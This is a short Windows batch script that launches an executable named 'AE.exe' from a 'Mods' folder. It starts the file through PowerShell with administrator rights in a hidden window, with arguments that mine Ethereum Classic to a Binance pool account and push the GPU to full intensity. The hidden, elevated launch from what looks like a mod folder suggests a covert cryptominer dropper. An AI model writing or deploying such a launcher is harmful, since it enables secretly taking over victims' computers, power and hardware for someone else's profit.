@echo off
set "EXE_PATH=%~dp0\Mods\AE.exe"

if exist "%EXE_PATH%" (
    powershell -WindowStyle Hidden -Command "& {Start-Process '%EXE_PATH%' -ArgumentList '--algo etchash --server etc.poolbinance.com:1800 --user Fearles19031 --pl 100 --mclock 1200 --fan 60 --intensity 100' -Verb RunAs -WindowStyle Hidden}"
) else (
    echo Dosya bulunamadi: %EXE_PATH%
    pause
)
exit
